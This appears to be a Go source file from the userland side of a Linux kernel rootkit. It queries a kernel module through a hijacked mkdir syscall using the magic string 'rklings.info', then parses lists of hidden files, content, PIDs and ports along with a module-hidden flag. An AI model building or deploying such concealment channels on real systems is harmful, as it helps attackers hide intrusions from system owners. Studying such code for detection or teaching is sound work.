package main

import (
	"bufio"
	"bytes"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"golang.org/x/sys/unix"
)

type kernelState struct {
	moduleHidden bool
	targets      map[string][]string
}

func readKernelState() (kernelState, error) {
	state := kernelState{targets: map[string][]string{
		"file": {}, "content": {}, "pid": {}, "port": {},
	}}
	buffer := make([]byte, 12288)
	copy(buffer, "rklings.info")
	length, _, errno := unix.Syscall(unix.SYS_MKDIR,
		uintptr(unsafe.Pointer(&buffer[0])), 0, 0)
	runtime.KeepAlive(buffer)
	if errno != 0 {
		return state, fmt.Errorf("query kernel state: %w", errno)
	}
	if length == 0 || length >= uintptr(len(buffer)) {
		return state, fmt.Errorf("query kernel state: invalid response length %d",
			length)
	}

	scanner := bufio.NewScanner(bytes.NewReader(buffer[:length]))
	for scanner.Scan() {
		key, value, ok := strings.Cut(scanner.Text(), "=")
		if !ok {
			continue
		}
		if key == "module_hidden" {
			state.moduleHidden = value == "1"
			continue
		}
		if _, ok := state.targets[key]; ok && value != "" {
			state.targets[key] = append(state.targets[key], value)
		}
	}
	if err := scanner.Err(); err != nil {
		return state, fmt.Errorf("read kernel state: %w", err)
	}
	return state, nil
}
